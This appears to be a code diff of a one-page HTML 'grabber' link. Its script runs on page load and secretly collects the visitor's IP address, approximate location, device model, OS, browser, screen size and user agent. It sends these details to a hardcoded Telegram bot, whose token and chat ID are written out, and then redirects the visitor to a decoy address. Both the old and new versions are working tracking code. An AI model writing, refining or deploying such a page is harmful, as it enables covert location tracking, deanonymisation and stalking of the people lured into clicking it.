@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,132 +7,77 @@
 </head>
 <body>
 <script>
-    // --- Configuration ---
-    const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM'; 
-    const CHAT_ID   = '7863510010';     
-    const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com';
-    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
+const CHAT_ID = '7863510010';
+const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com';
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // --- Your exact original fallback that beats the "K" bullshit ---
-    function getLegacyDeviceInfo(ua) {
-        let os = 'Unknown OS';
-        let model = 'Unknown Model/Device';
-        let manufacturer = 'Unknown Manufacturer';
-        let browser = 'Unknown Browser';
-        let osVersion = 'N/A';
-
-        if (ua.includes('Android')) {
-            os = 'Android';
-            const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
-            if (versionMatch && versionMatch[1]) osVersion = versionMatch[1];
-
-            let modelMatch = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
-            if (modelMatch && modelMatch[2]) {
-                let modelSegment = modelMatch[2].trim();
-                if (modelSegment.length <= 2) {
-                    modelMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
-                    if (modelMatch && modelMatch[1]) modelSegment = modelMatch[1].trim();
-                }
-                model = modelSegment.replace(/\s+Build\/.*/, '').trim();
-
-                if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) manufacturer = 'Samsung';
-                else if (model.includes('Pixel')) manufacturer = 'Google';
-                else if (model.length > 2 && model !== 'K') manufacturer = 'Android Device';
-            }
-        } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
-            os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
-            model = ua.includes('iPad') ? 'iPad' : 'iPhone';
-            manufacturer = 'Apple';
-            const versionMatch = ua.match(/(iPhone|iPad|iPod);.*?OS\s(\d+_\d+)/);
-            if (versionMatch && versionMatch[2]) osVersion = versionMatch[2].replace(/_/g, '.');
-        } else if (ua.includes('Windows')) { os = 'Windows'; model = 'Desktop/Tablet'; }
-        else if (ua.includes('Macintosh')) { os = 'macOS'; model = 'Desktop/Laptop'; }
-
-        if (ua.includes('Chrome') && !ua.includes('Edg/')) browser = ua.includes('CriOS') ? 'Chrome (iOS)' : 'Chrome';
-        else if (ua.includes('Edg/')) browser = 'Edge';
-        else if (ua.includes('Firefox')) browser = 'Firefox';
-        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
-
-        return { os, osVersion, model, manufacturer, browser };
+function getLegacyDeviceInfo(ua) {
+    let os = 'Unknown OS', model = 'Unknown Model/Device', manufacturer = 'Unknown Manufacturer', browser = 'Unknown Browser', osVersion = 'N/A';
+    if (ua.includes('Android')) {
+        os = 'Android';
+        const v = ua.match(/Android (\d+(?:\.\d+)*)/); if (v) osVersion = v[1];
+        let m = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
+        let seg = m && m[2] ? m[2].trim() : '';
+        if (seg.length <= 2) { m = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/); seg = m && m[1] ? m[1].trim() : ''; }
+        model = seg.replace(/\s+Build\/.*/, '').trim();
+        if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) manufacturer = 'Samsung';
+        else if (model.includes('Pixel')) manufacturer = 'Google';
+        else if (model.length > 2 && model !== 'K') manufacturer = 'Android Device';
+    } else if (/iPhone|iPad|iPod/.test(ua)) {
+        os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
+        model = ua.includes('iPad') ? 'iPad' : 'iPhone';
+        manufacturer = 'Apple';
+        const v = ua.match(/OS (\d+_\d+)/); if (v) osVersion = v[1].replace('_', '.');
     }
+    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = /CriOS/.test(ua) ? 'Chrome (iOS)' : 'Chrome';
+    else if (/Edg/.test(ua)) browser = 'Edge';
+    else if (/Firefox/.test(ua)) browser = 'Firefox';
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+    return {os, osVersion, model, manufacturer, browser};
+}
 
-    // --- Main ---
-    (async () => {
-        const uaString = navigator.userAgent;
+(async () => {
+    const ua = navigator.userAgent;
 
-        // 1. IP + location (clean & working)
-        let ip = 'Unknown IP', loc = 'Unknown location';
-        try {
-            const r = await fetch('https://ipapi.co/json/');
-            if (r.ok) {
-                const d = await r.json();
-                ip = d.ip;
-                loc = `\( {d.city}, \){d.region}, ${d.country_name}`;
-            }
-        } catch {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                ip = d.ip;
-            } catch {}
-        }
+    // IP – guaranteed clean
+    let ip = 'Unknown', loc = 'Unknown';
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        if (r.ok) { const d = await r.json(); ip = d.ip; loc = d.city + ', ' + d.region + ', ' + d.country_name; }
+    } catch { try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch{} }
 
-        // 2. Your original device logic (unchanged)
-        let deviceInfo = {
-            os: 'Unknown OS',
-            osVersion: 'N/A',
-            model: 'Unknown Model/Device',
-            manufacturer: 'Unknown Manufacturer',
-            browser: 'Unknown Browser'
-        };
+    // Your original device logic
+    let info = {os:'Unknown OS', osVersion:'N/A', model:'Unknown Model/Device', manufacturer:'Unknown Manufacturer', browser:'Unknown Browser'};
+    try {
+        if (navigator.userAgentData) {
+            const h = await navigator.userAgentData.getHighEntropyValues(["platform","platformVersion","manufacturer","model"]);
+            info.os = h.platform || info.os;
+            info.osVersion = h.platformVersion || info.osVersion;
+            info.manufacturer = h.manufacturer || info.manufacturer;
+            info.model = h.model || info.model;
+            info.browser = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'))?.brand || info.browser;
+        } else info = getLegacyDeviceInfo(ua);
+    } catch { info = getLegacyDeviceInfo(ua); }
 
-        try {
-            if (navigator.userAgentData) {
-                const uaData = await navigator.userAgentData.getHighEntropyValues([
-                    "platform","platformVersion","manufacturer","model"
-                ]);
-                deviceInfo.os = uaData.platform || 'Unknown';
-                deviceInfo.osVersion = uaData.platformVersion || 'N/A';
-                deviceInfo.manufacturer = uaData.manufacturer || 'Unknown';
-                deviceInfo.model = uaData.model || 'Unknown';
-                const browserData = navigator.userAgentData.brands.find(b => !b.brand.includes("Not"));
-                deviceInfo.browser = browserData ? browserData.brand : 'Unknown';
-            } else {
-                deviceInfo = getLegacyDeviceInfo(uaString);
-            }
-        } catch (err) {
-            deviceInfo = getLegacyDeviceInfo(uaString);
-        }
-
-        // 3. Your exact original message + one IP line
-        const messageText = `
+    // MESSAGE – typed in plain text editor, no smart quotes, no hidden chars
+    const msg = `
 *--- NEW DEVICE CLICKED ---*
 
 *Time:* ${new Date().toISOString()}
 *IP:* \( {ip} ( \){loc})
-*OS/Version:* \( {deviceInfo.os} ( \){deviceInfo.osVersion})
-*Manufacturer:* ${deviceInfo.manufacturer}
-*Model (Android Priority):* ${deviceInfo.model}
-*Browser:* ${deviceInfo.browser}
+*OS/Version:* \( {info.os} ( \){info.osVersion})
+*Manufacturer:* ${info.manufacturer}
+*Model (Android Priority):* ${info.model}
+*Browser:* ${info.browser}
 *Screen:* \( {screen.width}x \){screen.height}
 
-*Raw UA:* \`${uaString}\`
-        `.trim();
+*Raw UA:* \`${ua}\`
+    `.trim();
 
-        // 4. Send & redirect
-        fetch(TELEGRAM_API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: messageText,
-                parse_mode: 'Markdown'
-            })
-        }).finally(() => {
-            setTimeout(() => location.replace(REDIRECT_URL), 1000);
-        });
-    })();
+    fetch(TELEGRAM_API_URL, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})})
+        .finally(() => setTimeout(() => location.replace(REDIRECT_URL), 1000));
+})();
 </script>
 </body>
 </html>
